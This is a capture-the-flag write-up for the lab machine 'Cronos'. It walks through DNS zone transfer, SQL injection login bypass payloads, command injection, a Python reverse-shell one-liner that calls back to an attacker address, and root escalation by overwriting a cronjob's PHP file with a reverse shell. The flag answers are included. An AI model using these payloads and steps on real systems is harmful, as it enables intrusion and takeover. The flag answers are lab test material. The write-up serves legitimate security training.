# Tasks

[**1. How many TCP ports are listening on Cronos?**](#task-1)

[**2. What subdomain of cronos.htb is serving a login page over HTTP?**](#task-2)

[**3. What is the heading at the top of the webpage once authenticated?**](#task-3)

[**4. What user is the website on Cronos running as?**](#task-4)

[**5. User Flag**](#user-flag)

[**6. What is the full path to the file passed to php in a cronjob that runs every minute as the root user?**](#task-6)

[**7. Does www-data have write permissions on the artisan binary?**](#task-7)

[**8. Root Flag**](#root-flag)

# Tools Used

- nmap
- dig
- nc
- linpeas

# Skills Used

- DNS Enumeration
- Basic SQLi
- Command Injection
- Automated system enumeration (via linpeas)
- Cronjob Abuse (idk if that's what it's called but yeah)

# Solutions

## Task 1

You know the drill:

```
nmap -sCV [IP Address]
```

![image](https://github.com/user-attachments/assets/44fa3962-a8ac-4b2d-8206-2f455c8cbcdd)

**Answer: 3**

## Task 2

First off, let's put that domain name into _/etc/hosts_, like so:

![image](https://github.com/user-attachments/assets/f9d9ae5e-ff2a-40cb-bdd3-c4a04e3628a6)

We can add the subdomains to it later.

Anyways, the next part took me about 30 minutes, but with [this](https://medium.com/disruptive-labs/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6) and [this](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/), I got a lead on what I could do to conduct the subdomain enumeration.

**Disclaimer:** It took me 30 minutes cuz I was trying to use _dns.nse_ scripts for _nmap_ for sudomain enumeration.

This is new for me so I'll explain in detail as best as I can.

So what I used for the subdomain enueration was a _DNS Zone Transfer_. As far as I understand, it's a way to transfer data between two _DNS servers_. I'm not exactly sure how it works, but for now, that much info will do.

Knowing that, I can use _dig_ via _AXFR_ (protocol used for the _DNS Zone Transfer_) to get a list of subdomains with the targeted domain name.

To do that, I need to use this command:

```
dig axfr @[First DNS Server/Target Server IP Address] [Target Domain Name]
```

Which looks like this:

![image](https://github.com/user-attachments/assets/e283876b-27a2-409c-a26a-8b81f8dabd1b)

Anyways, after finding the subdomains, I instinctively went for _admin.cronos.htb_ lmao.

Add that to _/etc/hosts_, and turns out I was right.

![image](https://github.com/user-attachments/assets/d32b01d1-856c-445f-91ba-b234d7b32cc8)

**Answer: admin.cronos.htb**

## Task 3

Now before we can actually answer that, we do need to be authenticated, like the task said.

Considering _SQLi_ was mentioned as part of the machine, I assumed this is where to do it, considering I'm at a login page.

I tried the default ```admin:' or 1=1--```, but that didn't work.

After that, I looked at [**Chad Tib3rius Cheatsheet**](https://tib3rius.com/sqli.html) to see what I can do about it, and found this:

![image](https://github.com/user-attachments/assets/a446234a-a11e-4a6d-8d17-baaf66da08d9)

Tried to add that to the credentials like this ```admin:' or 1-1-- -```, but that still didn't work.

Then I thought maybe I should try that on the _username_, considering the rest of the query will get commented out anyway, since the query most probably looks like this:

```
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

Turns out I was right lmao.

![image](https://github.com/user-attachments/assets/94dcfd93-fa5f-4a78-9756-ecf34d9bed52)

Anyways, looks like I can do _command injection_ here now, but first, I gotta answer the question, which is probably...

**Answer: Net Tool v0.1**

## Task 4

Now we can do _command injection_.

**Bada bing**

![image](https://github.com/user-attachments/assets/692118ce-0f94-403a-9c2f-b63528158568)

**Bada boom**

![image](https://github.com/user-attachments/assets/d0a77d80-b7bf-41c8-917f-e8da59aca102)

**Answer: www-data**

## User Flag

For this, I'd rather get my own shell, so let's head over [**here**](https://www.revshells.com/) to get one.

Specifically this script btw:

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("[IP Address]",[Port]));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

Had to use ```which python``` in the web shell to make sure _python_ was there lol.

Anyways, after I got that, I decided to stablize it using this:

```
1. python -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm
3. CTRL + Z to background
4. stty raw -echo; fg (fg = foreground)
```

Result:

![image](https://github.com/user-attachments/assets/f1e8584a-ec57-4ff2-89b8-22734ef74b45)

**P.S.** Ignore the fact I did step 2 first lmao.

Now that we have a proper shell, let's actually get the flag.

Did ```find / -name user.txt -type f``` to find where it is, forgetting to add in ```2>/dev/null``` to get rid of all the other useless info, and found the flag.

![image](https://github.com/user-attachments/assets/11d1f311-3cfd-4a28-8957-ef03abaf5ef2)

And yes, I only did it after to show that it was clean lol.

**Answer: 94d561b764b68d7beaa6749157357fe5**

## Task 6

I got too lazy to enumerate it myself, but hey, why should I when I got _linpeas_?

Just run a _http server_ on my main machine with _python_ in the directory with _linpeas_ (yes, I have a dedicated directory for that lmao), use ```wget``` in _/tmp_ on the victim machine to get it,
run ```chmod +x``` on the file we got so that we can actually run it, then boom, auto enumeration.

![image](https://github.com/user-attachments/assets/ad7db112-d8fd-49db-beb5-a28950423024)

Just gotta love how _linpeas_ highlights very potentially interesting stuff about the system.

**Answer: /var/www/laravel/artisan**

## Task 7

![image](https://github.com/user-attachments/assets/c4962aa1-5d0f-4a94-8700-778b35560b8e)

Yes, yes it does.

**Answer: yes**

## Root Flag

Knowing that, we can probably do what we did in [**Bashed**](../Bashed/Writeup.md) and change the contents of the file to execute a reverse shell instead.

Back to [**here**](https://www.revshells.com) again lmao (this time we need php).

I'd show the script I selected but it's really long, so instead, I'll just say that I used _PHP Pentestmonkey's_ script.

Anyways, after _touching_ a new file named _artisan2_, and using _nano_ to paste the script there, I copied the contents of _artisan2_ into _artisan_.

Why didn't I just replace the code inside _artisan_ directly? Simple, it's a pain in the ass for me to use _nano_ on a reverse shell, even if it's stabilized lol.

![image](https://github.com/user-attachments/assets/3b4b2068-8432-4d18-a16c-b2f7c678e97c)

Anyways, after just 2 seconds of copying _artisan2_ into _artisan_, I got a shell from my _netcat_ listener, and got the flag.

![image](https://github.com/user-attachments/assets/d9f10801-ae39-4056-8b8c-ca274f2aabb6)

**Answer: 3e2817833a9a977bf0a3ebe71bb955be**
